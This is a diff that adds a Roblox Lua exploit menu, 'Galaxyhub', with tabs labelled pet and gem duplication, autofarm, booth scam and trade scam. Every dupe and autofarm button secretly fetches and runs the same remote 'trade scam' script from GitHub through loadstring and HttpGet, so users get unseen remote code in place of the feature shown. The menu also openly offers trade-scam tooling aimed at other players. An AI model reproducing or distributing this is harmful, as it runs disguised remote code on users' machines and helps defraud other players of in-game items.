@@ -1,0 +1,50 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Galaxyhub (Made by galaxy_boy14t#9259)", "BloodTheme")
+
+-- Tabs
+local Tab1 = Window:NewTab("dupe")
+local Tab2 = Window:NewTab("boothscam")
+local Tab3 = Window:NewTab("autofarm")
+local Tab4 = Window:NewTab("trade scam")
+local Tab5 = Window:NewTab("credits")
+local Tab6 = Window:NewTab("Keybind")
+
+-- Sections Inside Tabs
+local Tab1Section = Tab1:NewSection("dupe the pet")
+local Tab2Section = Tab2:NewSection("boothscam")
+local Tab3Section = Tab3:NewSection("autofarm")
+local Tab4Section = Tab4:NewSection("trade scam")
+local Tab5Section = Tab5:NewSection("jeslie_boy12")
+local Tab5Section = Tab5:NewSection("Join Discord Too")
+local Tab6Section = Tab6:NewSection("Press Any Key You Want")
+-- Buttons
+Tab1Section:NewButton("dupe pet", "this dupe is make your pet hc but wait 1 hour!", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptroblo1/trade-scam-script/main/trade%20scam'))()
+end)
+
+Tab1Section:NewButton("dupe gems", "this dupe is make your diamond 1t but wait 1 hour!", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptroblo1/trade-scam-script/main/trade%20scam'))()
+end)
+-- Tab4
+Tab4Section:NewButton("trade scam script", "gui trade scam", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptroblo1/trade-scam-script/main/trade%20scam'))()
+end)
+-- lets fix
+
+Tab2Section:NewButton("boothscam (Patch)", "Fix In Progress", function()
+    print("This patch IF you Dont Wait I dont fix")
+end)
+
+-- Tab3
+
+Tab3Section:NewButton("Autofarm Coins   ", "Coin farm!", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptroblo1/trade-scam-script/main/trade%20scam'))()
+end)
+
+Tab3Section:NewButton("Autofarm gems   ", "Gems farm!", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptroblo1/trade-scam-script/main/trade%20scam'))()
+end)
+--keybinds
+Tab6Section:NewKeybind("keybind", "wich key", Enum.KeyCode.F, function()
+	Library:ToggleUI()
+end)
